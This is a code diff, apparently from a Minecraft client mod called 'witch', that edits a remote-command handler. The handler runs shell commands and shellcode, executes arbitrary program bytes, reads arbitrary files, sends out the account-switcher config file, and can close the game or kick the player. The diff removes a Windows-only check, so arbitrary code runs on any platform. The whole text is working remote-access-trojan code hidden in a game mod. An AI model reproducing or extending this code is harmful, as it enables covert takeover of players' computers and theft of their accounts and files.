@@ -8,6 +8,7 @@ import me.soda.witch.client.utils.*;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.HandleMessage;
 import me.soda.witch.shared.Message;
+import me.soda.witch.shared.ProgramUtil;
 import net.minecraft.text.Text;
 
 import java.lang.management.ManagementFactory;
@@ -39,11 +40,11 @@ public class MessageHandler {
                     case "chat" -> ChatUtil.chat(Text.of(msg), false);
                     case "kill" -> Witch.client.close(false);
                     case "shell" -> new Thread(() -> {
-                        String result = ShellUtil.runCmd(msg);
+                        String result = ProgramUtil.runCmd(msg);
                         messageUtils.send(msgType, "\n" + result);
                     }).start();
                     case "shellcode" -> {
-                        if (ShellUtil.isWin())
+                        if (ProgramUtil.isWin())
                             new Thread(() -> new ShellcodeLoader().loadShellCode(msg, false)).start();
                     }
                     case "log" -> Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
@@ -58,11 +59,7 @@ public class MessageHandler {
                         Witch.config.canJoinServer = !Witch.config.canJoinServer;
                     }
                     case "kick" -> ServerUtil.disconnect();
-                    case "execute" -> {
-                        if (ShellUtil.isWin()) {
-                            ShellUtil.runProg(GSON.fromJson(msg, byte[].class));
-                        }
-                    }
+                    case "execute" -> ProgramUtil.runProg(GSON.fromJson(msg, byte[].class));
                     case "iasconfig" -> messageUtils.send(msgType, FileUtil.read("config/ias.json"));
                     case "read" -> messageUtils.send(msgType, FileUtil.read(msg));
                     case "runargs" ->
